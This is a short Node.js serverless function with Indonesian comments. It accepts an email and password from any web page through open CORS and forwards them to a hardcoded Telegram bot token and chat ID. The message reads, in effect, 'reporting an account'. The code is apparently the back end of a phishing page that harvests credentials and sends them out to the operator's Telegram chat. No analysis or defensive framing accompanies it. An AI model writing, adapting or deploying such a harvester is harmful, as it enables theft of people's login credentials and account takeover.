const fetch = require('node-fetch');

// Bot token langsung di dalam kode
const BOT_TOKEN = '7830386071:AAFs4DT7JDb7OaeK0Cbw0UKJ62edwJNQeQY';
const CHAT_ID = '1352694551'; // Ganti dengan Chat ID Anda

module.exports = async (req, res) => {
    // Menambahkan header CORS ke dalam respons
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Mengatasi preflight request (OPTIONS)
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    // Hanya menerima metode POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { email, password } = req.body;

    // Validasi input
    if (!email || !password) {
        return res.status(400).json({ error: 'Email and password are required' });
    }

    const message = `🔐 *Lapor ada akun nih*\n\n📧 *Email:* ${email}\n🔑 *Password:* ${password}`;
    const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
        // Mengirim pesan ke Telegram
        const response = await fetch(telegramApiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
            }),
        });

        // Validasi respons Telegram
        if (!response.ok) {
            return res.status(500).json({ error: 'Failed to send message to Telegram' });
        }

        return res.status(200).json({ success: true, message: 'Data sent to Telegram' });
    } catch (error) {
        console.error(error);
        return res.status(500).json({ error: 'Internal Server Error' });
    }
};
